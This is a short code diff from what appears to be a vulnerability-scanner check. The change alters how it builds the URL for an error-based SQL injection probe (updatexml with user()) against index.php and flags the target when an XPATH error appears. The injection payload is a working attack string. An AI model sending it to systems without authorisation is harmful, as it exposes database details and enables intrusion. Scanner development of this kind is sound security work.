@@ -18,7 +18,7 @@ def run(url, timeout):
         'payload': None
     }
     try:
-        payload = urllib.parse.urljoin(url, '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1')
+        payload = url + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
         response = requests.get(payload, timeout=timeout, verify=False)
         if re.search(r'XPATH syntax error', response.text):
             result['vulnerable'] = True
